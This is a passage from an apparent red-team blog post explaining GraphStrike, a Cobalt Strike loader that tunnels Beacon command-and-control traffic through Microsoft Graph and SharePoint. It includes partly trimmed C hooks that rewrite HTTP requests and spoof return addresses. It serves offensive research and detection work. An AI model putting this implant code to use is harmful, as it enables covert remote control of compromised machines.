&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;lpszVersion,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;lpszReferrer,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;*lplpszAcceptTypes,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;dwFlags,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD_PTR&nbsp;dwContext&nbsp;)
{
&nbsp;&nbsp;&nbsp;&nbsp;HINTERNET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hResult&nbsp;=&nbsp;INVALID_HANDLE_VALUE;

&nbsp;&nbsp;&nbsp;&nbsp;...&nbsp;Trimmed&nbsp;for&nbsp;Brevity&nbsp;...

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Only&nbsp;run&nbsp;the&nbsp;following&nbsp;if&nbsp;this&nbsp;is&nbsp;a&nbsp;GraphStrike&nbsp;Beacon
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(pMemAddrs-&gt;graphStrike)
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Determine&nbsp;whether&nbsp;this&nbsp;call&nbsp;to&nbsp;HttpOpenRequestA&nbsp;is&nbsp;for&nbsp;a&nbsp;http-get&nbsp;or&nbsp;http-post&nbsp;request
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(pMemAddrs-&gt;Api.msvcrt.strcmp(lpszVerb,&nbsp;C_PTR&nbsp;(&nbsp;OFFSET&nbsp;(&nbsp;"GET"&nbsp;)&nbsp;)&nbsp;)&nbsp;==&nbsp;0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;activeGet&nbsp;=&nbsp;TRUE;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;activeGet&nbsp;=&nbsp;FALSE;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...&nbsp;Trimmed&nbsp;for&nbsp;Brevity&nbsp;...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Set&nbsp;verb&nbsp;and&nbsp;uri&nbsp;to&nbsp;be&nbsp;used&nbsp;with&nbsp;HttpOpenRequest&nbsp;call.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Must&nbsp;be&nbsp;done&nbsp;here&nbsp;so&nbsp;that&nbsp;httpGetUri&nbsp;+&nbsp;httpPostUri&nbsp;are&nbsp;populated&nbsp;first
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;pMemAddrs-&gt;activeGet)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verb&nbsp;=&nbsp;GET_VERB;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uri&nbsp;=&nbsp;pMemAddrs-&gt;httpGetUri;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verb&nbsp;=&nbsp;PUT_VERB;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uri&nbsp;=&nbsp;pMemAddrs-&gt;httpPostUri;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Finally&nbsp;send&nbsp;request.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hResult&nbsp;=&nbsp;&nbsp;(&nbsp;HINTERNET&nbsp;)SPOOF(&nbsp;pMemAddrs-&gt;Api.net.HttpOpenRequestA,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.hNet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.size,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hInternet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verb,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uri,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;lpszVersion&nbsp;),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;lpszReferrer&nbsp;),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;lplpszAcceptTypes&nbsp;),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;U_PTR(&nbsp;dwFlags&nbsp;)&nbsp;),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;U_PTR(&nbsp;dwContext&nbsp;)&nbsp;)&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;If&nbsp;not&nbsp;a&nbsp;GraphStrike&nbsp;Beacon,&nbsp;make&nbsp;a&nbsp;normal&nbsp;call&nbsp;to&nbsp;HttpOpenRequestA
&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hResult&nbsp;=&nbsp;&nbsp;(&nbsp;HINTERNET&nbsp;)SPOOF(&nbsp;pMemAddrs-&gt;Api.net.HttpOpenRequestA,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.hNet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.net.size,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hInternet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;lpszVerb&nbsp;),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;lpszObjectName&nbsp;),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;lpszVersion&nbsp;),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;lpszReferrer&nbsp;),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;lplpszAcceptTypes&nbsp;),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;U_PTR(&nbsp;dwFlags&nbsp;)&nbsp;),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR(&nbsp;U_PTR(&nbsp;dwContext&nbsp;)&nbsp;)&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;hResult;
};</pre>
<p>To walk through the code, at line 18 the “lpszVerb” variable which is passed to HttpOpenRequestA_Hook by Beacon is examined to determine whether this call to HttpOpenRequestA is part of a http-get or a http-post cycle. We set the verbs to be used for Beacon’s http-get and http-post requests in the profile, so we can tell based on which one Beacon is trying to use what kind of request this is. This determination is used on line 27, where the type of request dictates the ‘verb’ and ‘uri’ that are to be used as parameters in the real call to HttpOpenRequestA. This is where we take advantage of our control of Beacon’s supplied parameters, using the upload URI’s that were assembled back when we first created the files in SharePoint as well as substituting “PUT” for “POST” in http-post requests so that we can use Graph API’s Upload method. The real API is finally called at line 39, using our custom defined ‘verb’ and ‘uri’ parameters in place of the original ‘lpszVerb’ and ‘lpszObjectName’ parameters specified by Beacon.</p>
</div>
</div>
</div>
</div>
<p data-renderer-start-pos="70338">GraphLdr also supports the use of normal Cobalt Strike HTTPS Beacons. All Beacons created by Cobalt Strike while ‘graphstrike.cna’ is imported will use GraphLdr as the Beacon UDRL, but we really only want to do all of the extra stuff in GraphLdr if the host set for this Beacon is ‘graph.microsoft.com’. Whether a Beacon is a GraphStrike or a standard HTTPS one is determined in the InternetConnectA_Hook function by examining the ‘lpszServerName’ parameter specified by Beacon. The result of this is later used at line 15 in the above snippet where we branch based on this Boolean. For normal HTTPS Beacons, the real API is called at line 54 using all of the original, unmodified parameters sent by Beacon (though we are still using AceLdr’s return address spoofing capability).</p>
<hr>
<div class="ak-editor-panel cc-ah2d0k" data-panel-type="info">
<div class="ak-editor-panel__content">
<p style="padding-left: 40px;" data-renderer-start-pos="71120"><span style="color: #3366ff;"><strong>• </strong></span>While GraphStrike supports using standard HTTPS Beacons alongside GraphStrike ones, the Cobalt Strike profile isn’t quite flexible enough yet to make this practical. The 4.9 release saw the addition of host profiles, but these only allow the customization of URI’s, headers, and parameters and do not yet support per-host specification of how Beacon metadata and session ID’s should be sent, nor how the TS should reply. This leads to standards HTTPS Beacons using the very un-obfuscated options for these values that were discussed earlier in the ‘Beacon Data and Profile Language’ section. I have spoken with the Cobalt Strike team about this issue and they hope to extend support for this level of customization some time in 2024.</p>
<hr>
<h4 data-renderer-start-pos="71856"></h4>
<h4 id="Synchronizing-the-Asynchronous" data-renderer-start-pos="71856"><span class="ez-toc-section" id="Synchronizing_the_Asynchronous" ez-toc-data-id="#Synchronizing_the_Asynchronous"></span>Synchronizing the Asynchronous<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="71888">I’ve talked at length about how GraphStrike’s communications model is inherently asynchronous and the challenges that come with it, but there is one more issue that must be discussed and mitigated. Beacon makes continued GET requests to the TS tasking file to download tasking, and the GraphStrike server similarly makes GET requests to the Beacon output file in order to download output; whatever is stored in that file, they will take and act on. This presents two problem scenarios:</p>
<ol class="ak-ol" start="1" data-indent-level="1">
<li>
<p data-renderer-start-pos="72377">A command is issued in Cobalt Strike and uploaded to the TS tasking file. Beacon downloads the command, runs it, and then sends it’s output. When Beacon is done sleeping it again downloads from the TS tasking file and runs the same command because no additional command was issued by Cobalt Strike to “wipe” the tasking file.</p>
</li>
<li>
<p data-renderer-start-pos="72706">Either the Beacon or the GraphStrike server uploads to their respective files in SharePoint twice before the other party manages to download the data from the first upload. This results in data loss and breaks things like SOCKS proxying which is reliant on a back-and-forth sequential exchange of data.</p>
</li>
</ol>
<p data-renderer-start-pos="73013">Luckily a singular solution exists for both of these scenarios. When Beacon makes a GET request to the TS tasking file and data is returned, InternetReadFile is called repeatedly until there is no more data to be read. Of course because we have hooked this API, our custom function is called instead wherein we wait until we have read all of the response data before uploading a blank file to the <strong data-renderer-mark="true">TS tasking file. </strong>This can be seen at line 32 in the following snippet, where ‘MakeWebRequest’ is called. Notice the unique combination of the ‘httpGetUri’ and the ‘PUT_VERB’ being used together:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">SECTION</span><span class="enlighter-g1">(</span><span class="enlighter-text"> D </span><span class="enlighter-g1">)</span><span class="enlighter-text"> BOOL </span><span class="enlighter-m0">InternetReadFile_Hook</span><span class="enlighter-g1">(</span><span class="enlighter-text"> HINTERNET hFile, </span></div></div><div class=""><div><span class="enlighter-text">                                          LPVOID lpBuffer, </span></div></div><div class=""><div><span class="enlighter-text">                                          DWORD dwNumberOfBytesToRead, </span></div></div><div class=""><div><span class="enlighter-text">                                          LPDWORD lpdwNumberOfBytesRead </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    BOOL bResult = </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Resolve API's</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> MemAddrs* pMemAddrs = *</span><span class="enlighter-g1">(</span><span class="enlighter-k2">struct</span><span class="enlighter-text"> MemAddrs**</span><span class="enlighter-g1">)((</span><span class="enlighter-text">PMEMADDR</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> MemAddr </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">address;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Call InternetReadFile</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    bResult = </span><span class="enlighter-g1">(</span><span class="enlighter-text"> BOOL </span><span class="enlighter-g1">)</span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">SPOOF</span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">InternetReadFile</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                     pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">hNet</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                     pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">size</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                     hFile, </span></div></div><div class=""><div><span class="enlighter-text">                                     </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpBuffer </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                     </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> dwNumberOfBytesToRead </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                     </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpdwNumberOfBytesRead </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Only run the following if this is a GraphStrike Beacon</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">graphStrike</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// If we are reading data from a GET request, set readTasking to TRUE</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">activeGet &amp;&amp; *lpdwNumberOfBytesRead </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> 0</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            pMemAddrs-</span><span 